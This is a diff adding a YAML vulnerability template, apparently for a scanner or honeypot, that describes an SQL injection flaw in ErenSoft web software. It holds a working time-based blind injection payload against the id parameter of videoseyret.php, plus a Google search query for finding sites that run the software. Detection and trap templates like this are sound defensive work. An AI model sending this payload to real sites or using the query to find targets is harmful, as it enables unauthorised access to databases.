@@ -1,0 +1,27 @@
+id: erensoft-sqli
+info:
+  name: ErenSoft - SQL Injection
+  author: r3Y3r53
+  description: 'SQL Injection is a type of SQL injection attack in which an attacker
+    can exploit a vulnerability in a web application''s input fields to manipulate
+    the application''s SQL queries.
+
+    '
+  severity: high
+  reference:
+  - https://cxsecurity.com/issue/WLB-2023070055
+  metadata:
+    verified: true
+    max-request: 1
+    google-query: intext:"Kodlama:Erensoft"
+  tags: sqli,unauth,erensoft
+traps:
+- request:
+    method: GET
+    path: /videoseyret.php?id=95%20AND%20(SELECT%204581%20FROM%20(SELECT(SLEEP(6)))NyiX)
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: videoseyretclass="entry-title"
